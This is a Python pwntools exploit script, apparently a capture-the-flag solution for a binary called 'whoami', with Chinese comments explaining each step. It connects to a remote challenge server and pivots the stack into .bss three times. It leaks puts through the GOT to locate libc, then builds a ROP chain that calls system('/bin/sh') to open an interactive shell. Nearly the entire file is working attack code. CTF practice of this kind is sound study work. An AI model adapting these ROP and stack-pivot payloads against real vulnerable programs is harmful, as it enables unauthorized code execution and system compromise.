from pwn import *

context.log_level='debug'
sh = remote("61.147.171.105", 60050)
# sh = process("./whoami")
# sh = gdb.debug("./whoami")  #  b *0x4007CC   read()
elf = ELF("./whoami")
libc = ELF("./libc-2.27.so")
# libc = ELF("./libc.so.6")

bss_addr = 0x601040  # 0xF0

leave_ret = 0x4007d6 # leave ; ret0x601040601040
ret = 0x40056e # ret

# 三次栈迁移

payload1 = b'a' * 0x20
payload1 += p64(bss_addr + 0xc0)    # 迁移地址rbp = bss_addr+0xc0 = 0x601100, rsp = leave_ret
payload1 += p64(leave_ret)          # rbp + 8 = leave_ret, rip = 0x4007cc
sh.sendafter("name:\n", payload1)
# 第一次read之后没有ret，payload2发送完执行完开始执行ret，迁移栈
# leave 之后 rsp = 0x601100(bass_addr+0xc0) + 8

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_plt = elf.plt['read']

system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']

pop_rsi_r15 = 0x400841 # pop rsi ; pop r15 ; ret
pop_rdi = 0x400843 # pop rdi ; ret
read_bss = 0x4007AA

payload2 = b'b'*(0xc0)         # 0x601100, 从0x601100开始写rop
payload2 += p64(bss_addr + 0x70)  # 迁移地址rbp = 0x6010b0  当前rsp = 迁移地址601108 *RSP  0x601108 —▸ 0x400843 ◂— pop rdi
payload2 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)  # puts(puts.got)
# puts执行完 rsp = 0x601128
payload2 += p64(read_bss)  #  执行read(0,0x601040,0xf0)， 把payload3写入bss_addr， 0x601040+0xc0+8 = 0x601108
# read后面跟着leave ret, 没有合适的gadget可以控制rdx寄存器, 所以执行当前main函数中的read代码片段，会将rdx设置为一个正常的0xf0，再通过read函数的ROP向更高地址的bss段写入数据
# pause()
# gdb.attach(sh)
sh.sendafter("Else?\n", payload2)

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - puts_libc
system_addr = libc_base + system_libc
print("libc_base: " + str(hex(libc_base)))

# rdi, rsi, rdx
payload3 = b'c' * 0x70
payload3 += p64(bss_addr + 0x900)  # 迁移地址rbp = 0x601348， 当前rsp = 0x6010b8  *RSP  0x6010b8 —▸ 0x400843 ◂— pop rdi
payload3 += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss_addr + 0x900) + p64(0) + p64(read_plt)
# 向更高地址的bss段（bss_addr+0x900）写入payload4, read（0, bss_addr+0x900, 第三个参数之前写了）
payload3 += p64(leave_ret)
sh.send(payload3)

# payload4 = p64(bss_addr + 0x400)  # rbp
payload4 = b'd' * 8  # rbp
payload4 += p64(pop_rdi) + p64(bss_addr + 0x900 + 0x28) #对应b'/bin/sh\x00'所在的地址  0x601368
payload4 += p64(ret)
payload4 += p64(system_addr)
payload4 += b'/bin/sh\x00'  # 0x601368
sh.send(payload4)

sh.interactive()
